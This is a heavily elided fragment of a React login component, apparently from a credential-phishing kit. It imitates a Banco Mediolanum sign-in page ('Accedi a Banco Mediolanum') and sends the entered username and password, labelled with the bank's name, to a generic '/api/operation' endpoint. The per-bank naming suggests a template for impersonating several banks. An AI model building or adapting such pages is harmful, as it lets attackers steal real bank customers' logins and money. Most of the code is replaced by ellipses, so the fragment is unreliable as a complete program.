...
export default function BancomediolanumConnect() {
    ...
    try {
      ...
      const response = await fetch("/api/operation", {
        ...
        body: JSON.stringify({ 
          username, 
          password, 
          bankName: "Banco-Mediolanum" // Ajout explicite du nom de la banque ici
        }),
      });
  ...
  return (
    <div className="bank-connect-container">
      ...
      <h1 className="bank-connect-title">Accedi a Banco Mediolanum</h1>
